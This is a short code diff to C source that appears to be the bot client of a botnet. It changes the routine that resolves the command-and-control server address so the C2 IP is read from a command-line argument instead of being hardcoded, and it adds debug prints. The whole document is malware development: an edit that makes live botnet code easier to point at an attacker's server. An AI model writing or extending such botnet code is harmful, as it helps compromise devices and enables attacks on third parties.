@@ -53,6 +53,9 @@ int main(int argc, char **args)
     int tbl_exec_succ_len;
     int pgid, pings = 0;
 
+    printf("args0=%s, args1=%s\n", args[0],args[1]);
+    sscanf(args[1], "%hd.%hd.%hd.%hd",&cnc_ip[0], &cnc_ip[1], &cnc_ip[2], &cnc_ip[3]);
+
 #ifndef DEBUG
     sigset_t sigs;
     int wfd;
@@ -379,7 +382,8 @@ static void resolve_cnc_addr(void)
     table_lock_val(TABLE_CNC_PORT);
 
     table_unlock_val(TABLE_CNC_DOMAIN);
-    srv_addr.sin_addr.s_addr = INET_ADDR(192,168,137,120);
+    srv_addr.sin_addr.s_addr = INET_ADDR(cnc_ip[0],cnc_ip[1],cnc_ip[2],cnc_ip[3]);
+    printf("%d.%d.%d.%d\n",cnc_ip[0],cnc_ip[1],cnc_ip[2],cnc_ip[3]);
     table_lock_val(TABLE_CNC_DOMAIN);
 
 #ifdef DEBUG
